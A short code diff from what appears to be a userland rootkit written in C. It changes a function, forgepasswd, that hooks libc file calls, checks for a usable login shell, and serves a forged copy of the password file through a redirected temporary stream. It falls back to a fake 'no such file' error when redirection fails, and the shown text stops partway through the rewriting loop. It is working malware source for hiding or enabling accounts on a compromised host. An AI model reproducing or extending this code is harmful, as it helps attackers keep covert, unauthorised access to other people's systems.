@@ -12,12 +12,13 @@ FILE *forgepasswd(const char *pathname){
          *ptok, *goodshell=NULL;
     int cur=0;
 
-    hook(CFOPEN, CACCESS);
-
-    fp = call(CFOPEN, pathname, "r");
-    if(fp == NULL)
+    fp = redirstream(pathname, &tmp);
+    if(fp == NULL){
+        errno = ENOENT;
         return NULL;
+    }
 
+    hook(CACCESS);
     for(int i=0; i < GOODSHELLS_SIZE; i++){
         if((long)call(CACCESS, goodshells[i], F_OK) == 0){
             goodshell = goodshells[i];
@@ -25,12 +26,10 @@ FILE *forgepasswd(const char *pathname){
         }
     }
 
-    if(goodshell == NULL)
+    if(goodshell == NULL){
+        fclose(tmp);
         return fp;
-
-    tmp = tmpfile();
-    if(tmp == NULL)
-        return fp;
+    }
 
     memset(line, 0, sizeof(line));
     while(fgets(line, sizeof(line), fp) != NULL){
